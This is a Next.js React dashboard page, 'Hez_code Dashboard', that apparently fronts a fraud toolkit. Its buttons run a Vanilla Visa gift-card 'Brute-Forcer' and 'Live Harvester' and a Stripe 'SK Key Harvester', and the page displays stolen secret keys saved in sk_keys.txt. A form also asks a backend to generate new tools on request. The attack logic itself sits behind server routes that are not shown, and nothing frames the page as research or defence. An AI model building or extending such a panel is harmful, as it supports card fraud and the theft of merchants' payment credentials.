import Head from 'next/head'
import { useState } from 'react'

export default function Home() {
  const [output, setOutput] = useState('Select a tool to execute...');
  const [loading, setLoading] = useState(false);
  const [toolPrompt, setToolPrompt] = useState('');

  const runTool = async (toolName) => {
    setLoading(true);
    setOutput(`Executing ${toolName}...`);
    
    try {
      const res = await fetch('/api/run-tool', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ toolName })
      });
      const data = await res.json();
      
      if (data.success) {
        let terminalText = data.output || 'Tool executed successfully with no output.';
        if (data.savedKeys) {
          terminalText += `\n\n--- Contents of sk_keys.txt ---\n${data.savedKeys}`;
        }
        setOutput(terminalText);
      } else {
        setOutput(`Error: ${data.error}\n${data.stderr || ''}`);
      }
    } catch (err) {
      setOutput(`Failed to communicate with server: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  const handleGenerateTool = async (e) => {
    e.preventDefault();
    if (!toolPrompt.trim()) return;

    setLoading(true);
    setOutput(`Generating new tool for: "${toolPrompt}"...`);

    try {
      const res = await fetch('/api/generate-tool', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ prompt: toolPrompt })
      });
      const data = await res.json();

      if (data.success) {
        setOutput(`[SUCCESS] ${data.message}\nSaved at: ${data.path}`);
      } else {
        setOutput(`Error generating tool: ${data.error}`);
      }
    } catch (err) {
      setOutput(`Failed to communicate with generator API: ${err.message}`);
    } finally {
      setLoading(false);
      setToolPrompt('');
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-8">
      <Head>
        <title>Hez_code Dashboard</title>
      </Head>
      <main className="max-w-6xl mx-auto">
        <h1 className="text-4xl font-bold mb-8">Hez_code Dashboard</h1>
        
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
          {/* Vanilla Visa Tools */}
          <div className="bg-gray-800 p-6 rounded-lg">
            <h2 className="text-2xl font-semibold mb-4">Vanilla Visa Tools</h2>
            <ul className="space-y-3">
              <li>
                <button 
                  onClick={() => runTool('vanilla_brute')} 
                  className="text-blue-400 hover:underline text-left w-full"
                >
                  &gt; Brute-Forcer
                </button>
              </li>
              <li>
                <button 
                  onClick={() => runTool('vanilla_harvester')} 
                  className="text-blue-400 hover:underline text-left w-full"
                >
                  &gt; Live Harvester
                </button>
              </li>
            </ul>
          </div>

          {/* Stripe Tools */}
          <div className="bg-gray-800 p-6 rounded-lg">
            <h2 className="text-2xl font-semibold mb-4">Stripe Tools</h2>
            <ul className="space-y-3">
              <li>
                <button 
                  onClick={() => runTool('stripe_sk_harvester')} 
                  className="text-blue-400 hover:underline text-left w-full"
                >
                  &gt; SK Key Harvester
                </button>
              </li>
            </ul>
          </div>

          {/* Generate New Tool Form */}
          <div className="bg-gray-800 p-6 rounded-lg md:col-span-2 lg:col-span-1">
            <h2 className="text-2xl font-semibold mb-4">Generate New Tool</h2>
            <form onSubmit={handleGenerateTool} className="space-y-4">
              <input 
                type="text" 
                value={toolPrompt}
                onChange={(e) => setToolPrompt(e.target.value)}
                placeholder="Describe your tool..." 
                className="w-full p-2 bg-gray-700 rounded text-white border border-gray-600 focus:outline-none focus:border-blue-500" 
              />
              <button 
                type="submit" 
                className="w-full bg-blue-600 hover:bg-blue-700 text-white p-2 rounded font-medium transition"
              >
                Generate
              </button>
            </form>
          </div>
        </div>

        {/* Real-time Output Terminal */}
        <div className="bg-black border border-gray-700 p-4 rounded-lg font-mono text-sm">
          <div className="text-gray-500 mb-2 border-b border-gray-800 pb-1">Execution Terminal Output:</div>
          <pre className="whitespace-pre-wrap text-green-400">{loading ? 'Processing...' : output}</pre>
        </div>
      </main>
    </div>
  );
}
